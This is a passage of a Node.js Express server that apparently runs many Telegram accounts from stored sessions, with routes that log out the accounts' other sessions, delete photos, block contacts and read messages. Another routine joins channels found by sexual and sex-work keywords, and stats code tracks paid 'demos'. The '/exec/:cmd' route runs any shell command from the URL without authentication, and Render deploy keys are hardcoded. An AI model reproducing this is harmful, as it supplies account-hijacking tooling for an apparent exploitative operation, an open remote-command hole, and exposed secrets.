        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/deletepp/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.deleteProfilePhotos();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/removeAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      await client.removeOtherAuths();
      res.send("Auths Removed");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/exec/:cmd', async (req, res, next) => {
  let cmd = req.params.cmd;
  console.log(`executing: `, cmd);
  try {
    res.send(console.log(execSync(cmd).toString()));
  } catch (error) {
    console.log(error);
  }
});

app.get('/blockusers/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      await client.blockAllUsers();
      res.send("Blocked Users");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});

app.get('/getAuths/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (!hasClient(user.mobile)) {
    const cli = await createClient(user.mobile, user.session);
    const client = await getClient(user.mobile);
    if (client) {
      res.json(await client.getAuths());
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});


app.get('/connectcliens/:limit/:skip', async (req, res) => {
  const limit = req.params?.limit;
  const skip = req.params?.skip;
  const db = ChannelService.getInstance();
  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';

  for (const user of users) {
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      if (cli) {
        resp += `${user.mobile} : true\n\n`;
      } else {
        resp += `${user.mobile} : false\n\n`;
      }
    }
  }

  resp += '</pre></body></html>';

  console.log("data: ", resp);
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/disconnectclients', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  await disconnectAll();
});

app.get('/promoteStats', async (req, res, next) => {
  const resp = await getPromotionStatsHtml();
  res.setHeader('Content-Type', 'text/html');
  res.send(resp)
});


app.get('/getusers/:limit/:skip', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);
  const db = ChannelService.getInstance();
  const users = await db.getUsers(limit, skip);
  res.json(users)
})

app.get('/getlastmsgs/:number/:limit', async (req, res, next) => {
  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);
  const number = req.params?.number;
  console.log(number, limit);
  const clientobj = getClient(number);
  await clientobj.client.connect();
  console.log(clientobj.client.connected);
  if (clientobj) {
    const result = await clientobj?.getLastMsgs(limit, number);
    res.send(result)
  } else {
    res.send("client is undefined");
  }

})

app.get('/getchannels', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getchannels`);
    await sleep(1000);
  }
});

app.get('/restart', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userName = req.query.userName;
  const checker = checkerclass.getinstance()
  checker.restart(userName.toLowerCase());
});

app.get('/receiveNumber/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const num = parseInt(req.params.num);
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await axios.get(`${data.url}receiveNumber/${num}`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/disconnectUser', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      await axios.get(`${data.url}exit`, { timeout: 7000 });
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.get('/tgclientoff/:num', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const processId = req.params.num;
    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, " : ", userName, ' - ', processId)

    try {
      const data = userMap.get(userName.toLowerCase());
      const url = data?.url;
      if (url) {
        const connectResp = await axios.get(`${url}getprocessid`, { timeout: 10000 });
        if (connectResp.data.ProcessId === processId) {
          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
          pushToconnectionQueue(userName, processId)
        } else {
          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);
          console.log("Request received from Unknown process")
        }
      }
    } catch (error) {
      console.log("Some Error: ", error.code)
    }

  } catch (error) {
    console.log("Some Error: ", error);
  }
});

app.get('/receive', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const data = userMap.get(userName.toLowerCase());
    if (data) {
      userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });
      pings[userName.toLowerCase()] = Date.now();
      console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), userName, 'Ping!! Received!!')
    } else {
      console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

const userAccessData = new Map();

app.get('/isRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  const accessData = userAccessData.get(chatId) || { timestamps: [], videoDetails: {} };
  const currentTime = Date.now();
  const recentAccessData = accessData?.timestamps?.filter(timestamp => currentTime - timestamp <= 15 * 60 * 1000);
  recentAccessData.push(currentTime);
  userAccessData.set(chatId, { videoDetails: accessData.videoDetails, timestamps: recentAccessData });
  res.send({ count: recentAccessData.length, videoDetails: accessData.videoDetails });
});

app.post('/isRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  let videoDetails = req.body;
  const accessData = userAccessData.get(chatId) || { timestamps: [], videoDetails: {} };
  videoDetails = { ...accessData.videoDetails, ...videoDetails }
  userAccessData.set(chatId, { videoDetails, timestamps: accessData.timestamps });
  res.send({ count: accessData.timestamps.length, videoDetails: videoDetails });
});

app.get('/resetRecentUser', (req, res) => {
  const chatId = req.query.chatId;
  userAccessData.delete(chatId);
  res.send({ count: 0 });
});

app.get('/paymentstats', async (req, res) => {
  const chatId = req.query.chatId;
  const profile = req.query.profile;
  const db = ChannelService.getInstance();
  const resp = await db.checkIfPaidToOthers(chatId, profile);
  console.log(resp)
  res.send(resp)
})


const playbackPositions = new Map();

app.get('/video', (req, res) => {
  let vid = req.query.video || 1;
  const chatId = req.query.chatId
  if (playbackPositions.has(chatId)) {
    if ((playbackPositions.get(chatId) + (3 * 60 * 1000)) > Date.now() && vid == '2') {
      vid = "3"
    }
  }
  let filePath = `./video${vid}.mp4`;
  playbackPositions.set(chatId, Date.now());
  const stat = fs.statSync(filePath);
  const fileSize = stat.size;

  const head = {
    'Content-Length': fileSize,
    'Content-Type': 'video/mp4',
  };

  res.writeHead(200, head);
  fs.createReadStream(filePath).pipe(res);

});


app.get('/requestcall', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    const chatId = req.query.chatId;
    const user = userMap.get(userName.toLowerCase());
    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);
    console.log(`Call Request Recived: ${userName} | ${chatId}`)
    if (user) {
      const payload = { chatId, profile: user.clientId }
      const options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        data: JSON.stringify(payload),
      };
      const result = await fetchWithTimeout("https://arpithared.onrender.com/events/schedule", options, 3);
      console.log(result?.data)
      // setTimeout(async () => {
      //   try {
      //     const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
      //     if (data.data) {
      //       console.log(`Call Request Sent: ${userName} | ${chatId}`)
      //       setTimeout(async () => {
      //         try {
      //           const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });
      //           setTimeout(async () => {
      //             await axios.get(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });
      //           }, 3 * 60 * 1000);
      //         } catch (error) {
      //           console.log(error)
      //         }
      //       }, 2 * 60 * 1000);
      //     } else {
      //       console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);
      //     }
      //   } catch (error) {
      //     console.log("Failed", user);
      //   }

      // }, 3 * 60 * 1000);
    } else {
      console.log("USer not exist!!")
    }
  } catch (error) {
    console.log("Some Error: ", error.code);
  }
});

app.listen(port, async () => {
  console.log(`Example app listening at http://localhost:${port}`)
});

let startedConnecting = false;
class checkerclass {
  static instance = undefined;

  constructor() {
    this.main();
  };

  static getinstance() {
    if (!checkerclass.instance) {
      console.log('creating instance-------')
      checkerclass.instance = new checkerclass();
    }
    return checkerclass.instance;
  }
  main() {
    // setInterval(async () => {
    //     console.log('--------------------------------------------');
    //     userMap.forEach(async (val, key) => {
    //         try {
    //             const resp = await axios.get(`${val.url}checkHealth`, { timeout: 10000 });
    //             if (resp.status === 200 || resp.status === 201) {
    //                 if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
    //                     console.log(resp.data.userName, ': All good');
    //                 } else {
    //                     console.log(resp.data.userName, ': DIAGNOSE - Checking Connection - ', resp.data.status);
    //                     await axios.get(`${ppplbot()}&text=${(resp.data.userName).toUpperCase()}:healthCheckError${resp.data.status}`);
    //                     try {
    //                         const connectResp = await axios.get(`${val.url}tryToConnect`, { timeout: 10000 });
    //                         console.log(connectResp.data.userName, ': CONNECTION CHECK RESP - ', connectResp.data.status);
    //                         await axios.get(`${ppplbot()}&text=${(connectResp.data.userName).toUpperCase()}:retryResponse -${connectResp.data.status}`);
    //                     } catch (e) {
    //                         console.log(val.url, `CONNECTION RESTART FAILED!!`);
    //                     }
    //                 }
    //             } else {
    //                 console.log(val.url, `is unreachable!!`);
    //             }
    //         } catch (e) {
    //             console.log(val.url, `is unreachable!!`);
    //             //console.log(e)
    //         }
    //     })
    // }, 120000);

    setInterval(async () => {
      count++;
      if (count % 2) {
        console.log(`-------------------------------------------------------------`)
      }
      if (connetionQueue.length > 0 && !startedConnecting) {
        while (connetionQueue.length > 0) {
          startedConnecting = true;
          if (connetionQueue.length == 1) {
            startedConnecting = false;
          }
          const { userName, processId } = connetionQueue.shift();
          console.log('Starting - ', userName);
          try {
            const data = userMap.get(userName.toLowerCase());
            const url = data?.url;
            if (url) {
              const connectResp = await axios.get(`${url}tryToConnect/${processId}`, { timeout: 10000 });
              console.log(connectResp.status)
            }
            setTimeout(async () => {
              try {
                const connectResp = await axios.get(`${url}promote`);
              } catch (error) {
                console.log(error.code)
              }
              setTimeout(async () => {
                try {
                  const connectResp2 = await axios.get(`${url}markasread`);
                } catch (error) {
                  console.log(error.code)
                }
              }, 35000);
            }, 35000);
          } catch (error) {
            console.log("Some Error: ", error.code)
          }
          await sleep(5000);
        }
      }

      const db = ChannelService.getInstance();

      Array.from(userMap.keys()).map(async (key) => {
        const val = userMap.get(key);
        if (val) {
          if ((Date.now() - pings[key]) > (5 * 60 * 1000) && (Date.now() - val.lastPingTime) > (5 * 60 * 1000)) {
            try {
              if ((Date.now() - pings[key]) > (7 * 60 * 1000) && (Date.now() - val.lastPingTime) > (7 * 60 * 1000)) {
                const url = val.url.includes('glitch') ? `${val.url}exit` : val.deployKey;
                await fetchWithTimeout(`${ppplbot()}&text=${val.clientId} : Not responding | url = ${url}`);
              } else {
                await fetchWithTimeout(`${ppplbot()}&text=${val.clientId} : not responding - ${(Date.now() - val.lastPingTime) / 60000}`);
              }
            } catch (error) {
              await fetchWithTimeout(`${ppplbot()}&text=${val.clientId} : Url not responding`);
              console.log("Some Error: ", error.code);
            }
          }

          if (val.downTime > 2) {
            console.log(val.clientId, " - ", val.downTime)
          }
          try {
            const resp = await axios.get(`${val.url}`, { timeout: 120000 });
            userMap.set(key, { ...val, downTime: 0 })
          }
          catch (e) {
            console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), val.url, ` NOT Reachable - ${val.downTime}`);
            userMap.set(key, { ...val, downTime: val.downTime + 1 })
            if (val.downTime > 5) {
              userMap.set(key, { ...val, downTime: -5 })
              try {
                const resp = await axios.get(`${val.deployKey}`, { timeout: 120000 });
                if (resp?.status == 200 || resp.status == 201) {
                  await fetchWithTimeout(`${ppplbot()}&text=Restarted ${key}`);
                } else {
                  console.log(`Failed to Restart ${key}`);
                  await fetchWithTimeout(`${ppplbot()}&text=Failed to Restart ${key}`);
                }
              } catch (error) {
                console.log(`Failed to Restart ${key}`);
                await fetchWithTimeout(`${ppplbot()}&text=Failed to Restart ${key}`);
              }
            }
          }

          const userPromoteStats = await db.readSinglePromoteStats(val.clientId);
          if (userPromoteStats?.isActive && (Date.now() - userPromoteStats?.lastUpdatedTimeStamp) / (1000 * 60) > 12) {
            try {
              const resp = await axios.get(`${val.url}promote`, { timeout: 120000 });
            } catch (error) {
              console.log("Some Error: ", error.code);
            }
          }
        } else {
          console.log(key, "- Does not exist");
        }
      })

      try {
        const resp = await axios.get(`https://mychatgpt-pg6w.onrender.com/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'ChatGPT', ` NOT Reachable`);
        await fetchWithTimeout(`${ppplbot()}&text=ChatGPT  NOT Reachable`);
        try {
          const resp = await axios.get(`https://api.render.com/deploy/srv-cflkq853t39778sm0clg?key=e4QNTs9kDw4`, { timeout: 55000 });
          if (resp?.status == 200 || resp.status == 201) {
            await fetchWithTimeout(`${ppplbot()}&text=Restarted CHATGPT`);
          }
        } catch (error) {
          console.log("Cannot restart ChatGpt server");
          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart ChatGpt server`);
        }
      }
      try {
        const resp = await axios.get(`https://uptimechecker.onrender.com`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'UpTimeBot', ` NOT Reachable`);
        await fetchWithTimeout(`${ppplbot()}&text=UpTimeBot  NOT Reachable`);
        try {
          const resp = await axios.get(`https://api.render.com/deploy/srv-cgqhefceooggt0ofkih0?key=CL2p5mx56c0`, { timeout: 55000 });
          if (resp?.status == 200 || resp.status == 201) {
            await fetchWithTimeout(`${ppplbot()}&text=Restarted UpTimeBot`);
          }
        } catch (error) {
          console.log("Cannot restart ChatGpt server");
          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart UpTimeBot server`);
        }
      }
      try {
        const resp = await axios.get(`https://tgsignup.onrender.com/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'ChatGPT', ` NOT Reachable`);
        await fetchWithTimeout(`${ppplbot()}&text=TgSignup  NOT Reachable`);
      }
      try {
        const resp2 = await axios.get(`https://054ee21e-d619-4708-bbbf-5ff3a6f04d3e-00-3ksn52c08p4vu.janeway.replit.dev/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'REPLIT', ` NOT Reachable`);
        await fetchWithTimeout(`${ppplbot()}&text=REPLIT  NOT Reachable`);
      }
      try {
        const resp = await axios.get(`https://tgcms.glitch.me/`, { timeout: 55000 });
      }
      catch (e) {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'uptime2', ` NOT Reachable`);
        await fetchWithTimeout(`${ppplbot()}&text=uptime2  NOT Reachable`);
        Array.from(userMap.keys()).map(async (key) => {
          const val = userMap.get(key);
          const payload = { url: val.url }
          const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            data: JSON.stringify(payload),
          };
          const result = await fetchWithTimeout("https://054ee21e-d619-4708-bbbf-5ff3a6f04d3e-00-3ksn52c08p4vu.janeway.replit.dev/check", options, 3);
          await sleep(3000)
        })
      }
    }, 120000);

    // setInterval(async () => {
    //   userMap.forEach(async (val, key) => {
    //     if (val.timeStamp + 230000 < Date.now()) {
    //       userMap.set(key, { ...val, timeStamp: Date.now() });
    //       try {
    //         await axios.get(`${ ppplbot() } & text=${ key } is DOWN!!`, { timeout: 10000 });
    //         await axios.get(`${ val.url }`, { timeout: 10000 });
    //         try {
    //           const resp = await axios.get(`${ val.url }checkHealth`, { timeout: 10000 });
    //           if (resp.status === 200 || resp.status === 201) {
    //             if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
    //               console.log(resp.data.userName, ': All good');
    //             } else {
    //               console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
    //               await axios.get(`${ ppplbot() } & text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${ resp.data.status } `);
    //               try {
    //                 const connectResp = await axios.get(`${ val.url } tryToConnect`, { timeout: 10000 });
    //                 console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
    //                 await axios.get(`${ ppplbot() }& text=${ (connectResp.data.userName).toUpperCase() }: RetryResponse - ${ connectResp.data.status } `);
    //               } catch (e) {
    //                 s
    //                 console.log(val.url, `CONNECTION RESTART FAILED!!`);
    //               }
    //             }
    //           } else {
    //             console.log(val.url, `is unreachable!!`);
    //           }
    //         } catch (e) {
    //           console.log(val.url, `is unreachable!!`);
    //           //console.log(e)
    //         }
    //       } catch (e) {
    //         console.log(e)
    //       }
    //     }
    //   })
    // }, 50000);
  }

  async restart(userName, processId) {
    const data = userMap.get(userName);
    console.log(data, userName);
    const url = data?.url;
    if (url) {
      userMap.set(userName, { ...data, timeStamp: Date.now() });
      try {
        //await axios.get(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });
        //await axios.get(`${ url } `, { timeout: 10000 });
        try {
          console.log('Checking Health')
          const resp = await axios.get(`${url} checkHealth`, { timeout: 10000 });
          if (resp.status === 200 || resp.status === 201) {
            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {
              console.log(resp.data.userName, ': All good');
            } else {
              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);
              await axios.get(`${ppplbot()}& text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${resp.data.status} `);
              try {
                const connectResp = await axios.get(`${url}tryToConnect/${processId} `, { timeout: 10000 });
                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);
                await axios.get(`${ppplbot()}& text=${(connectResp.data.userName).toUpperCase()}: RetryResponse - ${connectResp.data.status} `);
              } catch (e) {
                console.log(url, `CONNECTION RESTART FAILED!!`);
              }
            }
          } else {
            console.log(url, `is unreachable!!`);
          }
        } catch (e) {
          console.log(url, `is unreachable!!`);
          //console.log(e)
        }
      }
      catch (e) {
        console.log(e)
      }
    }
    else {
      console.log('url is undefined');
    }
  }
}

function extractNumberFromString(inputString) {
  const regexPattern = /\d+/;
  const matchResult = inputString?.match(regexPattern);
  if (matchResult && matchResult.length > 0) {
    // Parse the matched string into a number and return it
    return parseInt(matchResult[0], 10);
  }
  // If no number is found, return null
  return null;
}

async function createInitializedObject() {
  const initializedObject = {};
  const db = ChannelService.getInstance();
  const users = await db.getAllUserClients();
  for (const user of users) {
    if (extractNumberFromString(user.clientId))
      initializedObject[user.clientId.toUpperCase()] = {
        profile: user.clientId.toUpperCase(),
        totalCount: 0,
        totalPaid: 0,
        totalOldPaid: 0,
        oldPaidDemo: 0,
        totalpendingDemos: 0,
        oldPendingDemos: 0,
        totalNew: 0,
        totalNewPaid: 0,
        newPaidDemo: 0,
        newPendingDemos: 0,
        names: "",
        fullShowPPl: 0,
        fullShowNames: ""
      }
  }

  return initializedObject;
}

async function getPromotionStatsPlain() {
  let resp = '';
  const db = ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;
  }
  return resp;
}

async function getPromotionStats() {
  let resp = '';
  const db = ChannelService.getInstance();
  const result = await db.readPromoteStats();
  for (const data of result) {
    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;
  }
  return resp;
}

async function getPromotionStatsHtml() {
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  resp = resp + await getPromotionStats();
  resp += '</pre></body></html>';
  return resp;
}

async function getData() {
  const profileData = await createInitializedObject();
  const db = await ChannelService.getInstance();
  let entries = await db.readStats();
  // console.log(Object.keys(profileData));
  for (const entry of entries) {
    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;

    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])
    if (client && profileData[client.toUpperCase()]) {
      const userData = profileData[client.toUpperCase()];
      userData.totalCount += count;
      userData.totalPaid += payAmount > 0 ? 1 : 0;
      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;
      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;
      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;
      if (payAmount > 25 && !demoGiven) {
        userData.names = userData.names + ` ${name} |`
      }

      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {
        userData.fullShowPPl++;
        userData.fullShowNames = userData.fullShowNames + ` ${name} |`
      }

      if (newUser) {
        userData.totalNew += 1;
        userData.totalNewPaid += payAmount > 0 ? 1 : 0;
        userData.newPaidDemo += demoGivenToday ? 1 : 0;
        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;
      }
    }
  }
  const profileDataArray = Object.entries(profileData);
  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);
  let reply = '';
  for (const [profile, userData] of profileDataArray) {
    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;
  }

  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);
  let reply2 = '';
  for (const [profile, userData] of profileDataArray) {
    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;
  }

  let reply3 = await getPromotionStats()

  return (
    `<div>
      <div style="display: flex; margin-bottom: 60px">
        <div style="flex: 1;">${reply}</div>
        <div style="flex: 1; ">${reply2}</div>
      </div>
      <div style="display: flex;">
        <div style="flex: 1; " >${reply3}</div>
      </div>
    </div>`
  );
}
function pushToconnectionQueue(userName, processId) {
  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
  if (existingIndex !== -1) {
    connetionQueue[existingIndex].processId = processId;
  } else {
    connetionQueue.push({ userName, processId });
  }
}


async function joinchannels(value) {
  try {
    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });
    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)
    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 300) {
      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)
      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];
      const db = ChannelService.getInstance();
      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');
      for (const channel of channels) {
        try {
          console.log(channel.username);
          const username = channel?.username?.replace("@", '');
          if (username) {
            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);
            await sleep(200000);
          }
        } catch (error) {
          console.log("Some Error: ", error)
        }
      }
    }
  } catch (error) {
    console.log(error)
  }
}